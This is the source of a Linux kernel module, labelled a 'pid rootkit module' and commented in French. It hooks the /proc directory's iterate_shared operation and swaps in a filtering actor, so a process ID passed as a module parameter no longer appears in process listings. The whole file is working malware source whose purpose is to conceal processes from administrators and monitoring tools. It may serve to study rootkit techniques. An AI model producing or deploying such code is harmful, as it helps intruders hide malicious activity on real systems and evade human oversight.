// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/dcache.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/path.h>
#include <linux/namei.h>

MODULE_DESCRIPTION("pid rootkit module");
MODULE_AUTHOR("Maxime Derri");
MODULE_LICENSE("GPL");

static char *to_hide = "1";
module_param(to_hide, charp, 0600);

static struct dir_context *save_ctx, ctx_2;
static struct file *f_proc;
static struct file_operations fops;
static const struct file_operations *save_fops;
static struct inode *ino_proc;


int my_actor(struct dir_context *ctx, const char *name, int nlen, loff_t off,
							u64 ino, unsigned int x)
{
	u64 sz1, sz2;

	sz1 = strlen(name);
	sz2 = strlen(to_hide);
	if (sz1 != sz2) //pas la bonne taille
		goto normal;
	if (strncmp(name, to_hide, sz1) == 0) //la cible ?
		return 0;
normal: //execution classique
	return save_ctx->actor(save_ctx, name, nlen, off, ino, x);
}

int my_iterate_shared(struct file *fp, struct dir_context *ctx)
{
	int ret = 0;

	ctx_2.pos = ctx->pos; //ctx_2 contient my_actor
	save_ctx = ctx; //sauvegarde du bon ctx, pour etre utilise depuis
			//my_actor
	ret = save_fops->iterate_shared(fp, &ctx_2);
	ctx->pos = ctx_2.pos;

	return ret;
}

static int __init module_init_hide_pid(void)
{
	int ret = 0;

	//on pourrait aussi utiliser kern_path pour obtenir le dentry puis l'inode
	f_proc = filp_open("/proc", O_RDONLY | O_DIRECTORY, 0600);
	if (IS_ERR(f_proc)) {
		ret = -EINVAL;
		goto err;
	}

	ino_proc = file_dentry(f_proc)->d_inode;
	if (ino_proc == NULL) {
		ret = EINVAL;
		goto err2;
	}

	//backup
	save_fops = ino_proc->i_fop;

	//changer la fct
	fops = *ino_proc->i_fop;
	fops.iterate_shared = my_iterate_shared;
	ino_proc->i_fop = &fops;

	ctx_2.actor = my_actor;

	pr_warn("init\n");
err2:
	filp_close(f_proc, NULL);
err:
	return ret;
}

module_init(module_init_hide_pid);

static void __exit module_exit_hide_pid(void)
{
	if (ino_proc != NULL)
		ino_proc->i_fop = save_fops;
	pr_warn("exit\n");
}
module_exit(module_exit_hide_pid);
